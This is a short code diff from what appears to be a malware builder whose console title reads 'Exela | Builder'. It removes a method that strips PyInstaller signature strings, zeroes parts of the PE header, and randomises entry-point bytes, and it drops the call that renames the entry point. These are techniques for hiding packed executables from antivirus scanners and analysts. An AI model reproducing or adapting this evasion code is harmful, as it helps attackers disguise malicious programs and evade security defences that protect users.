@@ -17,7 +17,6 @@ class SubModules:
                 time.sleep(1)
                 SubModules().RemoveMetaData(file_path)
                 print("Renaming Entrypoints")
-                SubModules().RenameEntryPoint(file_path, "loader-o")
             else:print("err")
         except Exception as e:
             print(f"Error for exe headers : {str(e)}")
@@ -30,25 +29,6 @@ class SubModules:
         new_entryPoint = b'\x00' + os.urandom(len(entryPoint) - 1)
         data = data.replace(entryPoint, new_entryPoint)
 
-        with open(file_path, "wb") as file:
-            file.write(data)
-            del data # remove variable from memory
-    @staticmethod
-    def RemoveMetaData(file_path:str) -> None:
-        try:
-            ctypes.windll.kernel32.SetConsoleTitleW(f"Exela | Builder | Removigin Metadata") 
-        except:pass
-        with open(file_path, "rb") as file:
-            data = file.read()
-        data = data.replace(b"PyInstaller:", b"PyInstallem:")
-        data = data.replace(b"pyi-runtime-tmpdir", b"bye-runtime-tmpdir")
-        data = data.replace(b"pyi-windows-manifest-filename", b"bye-windows-manifest-filename")
-        start_index = data.find(b"$") + 1
-        end_index = data.find(b"PE\x00\x00", start_index) - 1
-        data = data[:start_index] + bytes([0] * (end_index - start_index))  + data[end_index:]
-        start_index = data.find(b"PE\x00\x00") + 8
-        end_index = start_index + 4
-        data = data[:start_index] + bytes([0] * (end_index - start_index))  + data[end_index:]
         with open(file_path, "wb") as file:
             file.write(data)
             del data # remove variable from memory
